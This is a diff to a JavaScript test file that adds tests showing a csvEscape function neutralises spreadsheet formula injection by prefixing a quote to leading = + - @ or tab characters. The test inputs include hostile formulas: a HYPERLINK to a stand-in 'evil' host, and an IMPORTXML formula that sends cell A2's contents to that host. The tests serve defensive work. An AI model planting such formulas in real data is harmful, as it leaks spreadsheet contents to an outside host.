@@ -38,6 +38,27 @@ test('recordsToCsv emits a header + one CRLF-delimited row per record', () => {
   assert.ok(lines[1].includes('hiring; funding'));
 });
 
+test('csvEscape neutralises spreadsheet formula injection (leading = + - @)', () => {
+  // A leading formula char gets a single-quote prefix so Excel/Sheets treats it
+  // as text; embedded commas/quotes still trigger RFC-4180 wrapping.
+  assert.equal(csvEscape('=HYPERLINK("http://evil","x")'), '"\'=HYPERLINK(""http://evil"",""x"")"');
+  assert.equal(csvEscape('+1-800-EVIL'), "'+1-800-EVIL");
+  assert.equal(csvEscape('-2+3'), "'-2+3");
+  assert.equal(csvEscape('@SUM(A1)'), "'@SUM(A1)");
+  assert.equal(csvEscape('\t=cmd'), "'\t=cmd");
+  // benign values are untouched
+  assert.equal(csvEscape('Acme Pty'), 'Acme Pty');
+  assert.equal(csvEscape('a=b'), 'a=b'); // '=' not leading → safe
+});
+
+test('recordsToCsv formula-guards a malicious company_name field', () => {
+  const csv = recordsToCsv([
+    rec({ company_name: '=IMPORTXML(CONCAT("http://evil/?d=",A2),"//x")' }),
+  ]);
+  // the data cell is prefixed with ' inside its RFC-4180 quotes
+  assert.match(csv.split('\r\n')[1], /^"'=IMPORTXML/);
+});
+
 test('recordsToCsv on an empty list is just the header', () => {
   const csv = recordsToCsv([]);
   assert.equal(csv.split('\r\n').length, 1);
